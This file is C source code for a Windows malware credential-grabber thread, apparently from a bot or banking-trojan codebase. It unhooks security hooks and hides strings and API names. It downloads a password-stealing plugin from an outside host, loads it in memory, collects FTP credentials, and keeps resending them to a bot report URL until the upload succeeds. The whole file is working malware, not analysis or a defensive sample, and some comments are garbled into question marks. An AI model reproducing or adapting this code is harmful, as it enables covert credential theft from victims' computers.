#include <windows.h>

#include "GetApi.h"
#include "Loader.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Config.h"
#include "Crypt.h"
#include "Utils.h"
#include "Unhook.h"


DWORD WINAPI GrabberThread( LPVOID lpData )
{
	UnhookDlls();

//	char *Host = ('r','u','d','e','r','m','a','n','.','r','u',0);

	char GrabberFile[] = {'r','u','d','e','r','m','a','n','.','r','u','/','j','s','/','p','a','s','s','w','.','p','l','u','g',0};

	char GrabberUrl[256];

	m_lstrcpy( GrabberUrl, GrabberFile );
	//m_lstrcat( GrabberUrl, GrabberFile );


	LPVOID BotModule = NULL;

	bool bKnock = false;

	while ( ( BotModule = DownloadPlugin( GrabberUrl ) ) == NULL ) 
	{
		pSleep( 1000 * 60 * 5 );
	}

	if ( BotModule != NULL  )
	{
		HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );

		if ( hLib == NULL )
		{
			return 0;
		}

		typedef char * ( WINAPI *PFTPGRAB )();

		char GrabFTP[] = {'S','c','a','n','1', 0 };
		char Ole32[]   = {'o','l','e','3','2','.','d','l','l', 0};

		typedef void ( WINAPI *PCoUninitialize )();
		typedef HRESULT ( WINAPI *PCoInitialize )( LPVOID lpReserved );

		PCoUninitialize pCoUninitialize = (PCoUninitialize)GetProcAddressEx( Ole32, 0, 0xEDB3159D );
		PCoInitialize   pCoInitialize   = (PCoInitialize)GetProcAddressEx( Ole32, 0, 0xF341D5CF );
		
		pCoUninitialize();
		pCoInitialize( NULL );
		
		PFTPGRAB FtpGrabber	 = (PFTPGRAB)MemoryGetProcAddress( hLib, GrabFTP );
		
		char *Buffer = FtpGrabber();

		DWORD dwSize = m_lstrlen( Buffer );

		if ( dwSize != 0 )
		{
			Buffer[ dwSize ] = '\0';

			bool Sended = false;
			do
			{
				// ?????????? ?????? ?? ??????
                PCHAR ReportURL = GetBotScriptURL(ScriptGrabber);
				Sended = SendGrabberReport(ReportURL, Buffer, dwSize);
				if (!Sended)
					pSleep( 1000 );
				STR::Free(ReportURL);
			}
			while (!Sended);
		}

		MemFree( Buffer );
		MemFree( BotModule );

		MemoryFreeLibrary( hLib );
	}

	pExitProcess( 1 );
	
	return 0;
}

